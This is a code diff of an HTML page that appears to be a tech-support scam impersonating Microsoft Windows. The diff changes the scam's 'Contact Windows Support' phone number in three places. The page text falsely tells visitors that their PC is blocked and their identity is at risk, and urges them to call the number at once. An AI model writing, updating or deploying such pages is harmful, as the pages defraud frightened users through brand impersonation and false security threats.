@@ -560,7 +560,7 @@
             <div class="right-foot" style="text-align: center;">
                 <span id="footertxt"><img src="microsoft.png"> Windows: </span><span
                         style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Support <span
-                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-808-278-5249
+                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-808-289-9969
 
 
 
@@ -591,7 +591,7 @@
     <img id="banner" src="virus-images.png">
     <div id="disclaimer">
         Access to this PC has been blocked due to security reasons.<br>
-        <span class="support">Contact Windows Support: +1-808-278-5249
+        <span class="support">Contact Windows Support: +1-808-289-9969
 
 
 
@@ -641,7 +641,7 @@
     <p>To report this threat, stop identity theft, and regain access to this device, dial Windows Help right away.</p>
     <p>Your personal information will be at danger if you close this window, and your Windows Registration will be suspended.</p>
     <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
-        +1-808-278-5249
+        +1-808-289-9969
 
 
 
